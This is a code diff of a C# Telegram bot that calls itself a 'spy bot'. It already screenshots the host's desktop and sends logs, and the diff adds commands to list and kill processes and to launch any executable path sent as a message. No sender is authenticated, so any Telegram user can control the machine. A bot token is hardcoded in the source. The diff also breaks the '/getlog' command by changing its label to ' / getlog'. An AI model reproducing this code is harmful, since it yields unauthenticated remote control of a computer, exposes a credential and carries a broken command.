@@ -12,9 +12,16 @@ using Newtonsoft.Json;
 using System.Collections.Specialized;
 using System.IO;
 using System.Drawing.Imaging;
+using System.Diagnostics;
 
 namespace TelegramBot
 {
+    public enum BotState
+    {
+        Wait,
+        KillProc,
+        StartProc
+    }
     public partial class MainForm : Form
     {
         private string token = "1416810810:AAGM84vwYkU0_6UlsdBYfea4246S00Cm_fA";
@@ -22,6 +29,7 @@ namespace TelegramBot
         WebClient client;
         private long LastUpdateID=0;
         private string fileLog = "BotLog.log";
+        BotState botState = BotState.Wait;
         public MainForm()
         {
             InitializeComponent();
@@ -65,7 +73,34 @@ namespace TelegramBot
             {
                 LastUpdateID = result.update_id;
                 WriteLog(result.message.from.first_name + "(" + result.message.from.id + "): " + result.message.text);
-                SendAnswer(result.message.chat.id,result.message.text);
+                switch (botState)
+                {
+                    case BotState.KillProc: 
+                        if (CloseProcess(result.message.text)) 
+                        {
+                            SendMessage(result.message.chat.id, "Process is stopped.  ");
+                            WriteLog("Process " + result.message.text + " is closed");
+                        }
+                        else
+                        {
+                            SendMessage(result.message.chat.id, "Error, no such process exists. ");
+                        }
+                        break;
+                    case BotState.StartProc:
+                        if (StartProcess(result.message.text))
+                        {
+                            SendMessage(result.message.chat.id, "Application is started.  ");
+                            WriteLog("Application " + result.message.text + " is started");
+                        }
+                        else
+                        {
+                            SendMessage(result.message.chat.id, "Error, no such papplication exists. ");
+                        }
+                        break;
+                    default:
+                        SendAnswer(result.message.chat.id, result.message.text);
+                        break;
+                }
 
             }
         }
@@ -76,17 +111,30 @@ namespace TelegramBot
             {
                 case "/help": answer = @"Welcome to the bot helper. 
 All supported commands are listed below:
-/start      - getting started with a bot
-/help       - list of available commands
-/getlog     - send you log file data
-/screenshot - send screenshot of your desktop";
+/start - getting started with a bot
+/help - list of available commands
+/getlog - send you log file data
+/screenshot - send screenshot of your desktop
+/taskmanager- shows a list of processes on the server computer
+/stopprocess- stops the selected process
+/startprocess- starts the selected process";
 
                         break;
-                case "/getlog": answer = RetLog();
+                case " / getlog": answer = RetLog();
                     break;
                 case "/start": answer = "I'm your spy bot, you know what i can do? /help";
                     break;
-                case "/screenshot": SendPrintScreen(chatID); return;
+                case "/screenshot": SendPrintScreen(chatID);
+                    return;
+                case "/taskmanager": answer = GetRunningProcesses();
+                    break;
+                case "/stopprocess": answer = GetRunningProcesses() + "\r\n Which one?";
+                    botState=BotState.KillProc;
+                    break;
+                case "/startprocess":
+                    answer ="\r\n Which one?";
+                    botState = BotState.StartProc;
+                    break;
                 default: answer = "You write to me: '"+message+"', but i dont know what to answer";
                     break;
             }
@@ -277,6 +325,56 @@ All supported commands are listed below:
                 g.DrawImage(b, 0, 0, nWidth, nHeight);
             }
                 return result;
+        }
+        private Bitmap ResizeImg(Bitmap b, int numberOfcompression)
+        {
+            return ResizeImg(b, b.Width / numberOfcompression, b.Height / numberOfcompression);
+        }
+
+        private string GetRunningProcesses()
+        {
+            Process[] procList = Process.GetProcesses();
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("List of Processes: ");
+            sb.AppendLine(new string('=', 25));
+            foreach (Process p in procList)
+            {
+                if (!string.IsNullOrEmpty(p.MainWindowTitle))
+                {
+                    sb.AppendLine(p.StartTime + ": " + p.ProcessName + " - " + p.MainWindowTitle);
+                }
+            }
+            sb.AppendLine(new string('=', 25));
+            return sb.ToString();
+        }
+        private bool CloseProcess(string nameProc)
+        {
+            botState=BotState.Wait;
+            Process[] procList = Process.GetProcesses();
+            foreach (Process p in procList)
+            {
+                if (p.ProcessName==nameProc)
+                {
+                    Process.GetProcessesByName(nameProc)[0].Kill();
+                    return true;
+                }
+            }
+
+            return false;
+        }
+        private bool StartProcess(string path)
+        {
+            botState = BotState.Wait;
+            if(File.Exists(path))
+            {
+                Process.Start(path);
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+
         }
     }
 }
